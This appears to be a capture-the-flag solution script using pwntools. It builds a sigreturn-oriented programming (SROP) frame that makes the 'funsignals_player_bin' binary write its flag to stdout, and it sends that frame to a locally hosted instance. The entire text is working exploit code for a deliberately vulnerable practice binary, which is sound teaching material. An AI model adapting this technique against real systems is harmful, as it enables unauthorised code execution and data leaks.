#!/usr/bin/env python3
from pwn import *

elf = ELF("./funsignals_player_bin")
context.arch = 'amd64'

def srop(rax, rdi, rsi, rdx, rip):
    frame = SigreturnFrame()
    frame.rax = rax # syscall number for write()
    frame.rdi = rdi # stdout=1
    frame.rsi = rsi # the address of flag
    frame.rdx = rdx # leak how many bytes of data
    frame.rip = rip # the address of syscall

    return frame

def exploit():
    # socat tcp4-listen:1337,reuseaddr,fork exec:./funsignals_player_bin
    r = remote('127.0.0.1', 1337)
    frame = srop(
    rax=constants.SYS_write,
    rdi=constants.STDOUT_FILENO,
    rsi=elf.sym['flag'],
    rdx=50,
    rip=elf.sym['syscall'],
)
    r.send(bytes(frame))
    print(r.readall())

if __name__ == "__main__":
    exploit()